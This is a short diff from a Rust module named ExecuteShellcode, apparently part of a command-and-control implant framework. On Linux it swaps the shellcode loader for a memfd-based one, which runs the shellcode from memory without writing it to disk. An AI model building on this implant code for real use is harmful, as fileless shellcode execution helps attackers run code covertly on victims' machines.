@@ -50,7 +50,7 @@ impl Module for ExecuteShellcode {
             }
             #[cfg(target_os = "linux")]
             {
-                ret = to_error!(malefic_helper::linux::loader::loader(bin, request.output))?;
+                ret = to_error!(malefic_helper::linux::loader::memfd::loader(bin, request.output))?;
             }
         }
 
